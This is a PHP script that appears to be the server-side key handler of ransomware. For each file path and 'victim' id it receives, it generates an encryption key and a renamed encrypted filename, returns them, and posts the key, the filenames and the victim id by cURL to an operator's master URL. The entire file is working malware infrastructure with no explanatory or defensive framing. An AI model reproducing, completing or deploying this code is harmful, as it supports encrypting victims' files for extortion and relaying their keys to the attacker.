<?php
error_reporting(0);
set_time_limit(0);

include('config.php');

function GenerateKey($length){
    $characters = '0123456789QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm%^&$#@!)(*&';
    $string = '';    

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters))];
    }

    if(strlen($string) == "32") {
    	return $string;
    } else {
    	return GenerateKey($length);
    }
}

function GenerateName($filename, $id){
	$a = strrev($filename);
	$b = explode(base64_decode("XA=="), $a);
	$c = strrev($b[0]);
    $length = 60;
    $characters = '0123456789QWERTYUIOPASDFGHJKLZXCVBNM';
    $string = '';

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters))];
    }

    $code = $id.$string;
	$name = str_replace($c, $code, $filename);
	return $name;
}

if(!empty($_GET['file']) && !empty($_GET['id'])) {
	$filename = base64_decode($_GET['file']);
	$oriname = base64_encode($filename);
	$victim = base64_decode($_GET['id']);
	$key = base64_encode(GenerateKey(32));
	$encname = base64_encode(GenerateName($filename, $victim).".".$MASTER_EXTENSION);
	echo '
{
	"X":"'.$key.'",
	"Y":"'.$encname.'"
}';
	$data = "file={$oriname}&encfile={$encname}&key={$key}&id={$victim}";
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $MASTER_URL);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_TIMEOUT,30);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_exec($ch);
	curl_close($ch);
}